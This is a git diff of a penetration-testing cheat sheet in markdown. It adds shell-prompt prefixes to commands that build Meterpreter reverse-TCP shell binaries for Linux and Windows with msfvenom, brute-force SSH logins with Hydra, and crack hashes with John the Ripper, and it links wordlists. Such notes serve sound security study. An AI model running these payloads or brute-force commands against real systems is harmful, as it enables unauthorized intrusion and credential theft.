@@ -149,11 +149,11 @@ msfconsole> run
 #### Binaries
 ##### Linux
 ```
-msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f elf -o shell.elf
+$ msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f elf -o shell.elf
 ```
 ##### Windows
 ```
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f exe -o shell.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f exe -o shell.exe
 ```
 
 ### Meterpreter Commands
@@ -189,7 +189,7 @@ $ john --wordlist=/usr/share/wordlists/rockyou.txt <HASH FILE>
 ### Hydra
 #### SSH Bruteforcing
 ```
-hydra -L users.txt -P passwords.txt ssh://<IP ADDR>:<PORT>
+$ hydra -L users.txt -P passwords.txt ssh://<IP ADDR>:<PORT>
 ```
 [Wordlist for users](https://github.com/nmap/ncrack/blob/master/lists/minimal.usr)  
 [Wordlist for passwords - (small)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-15.txt)
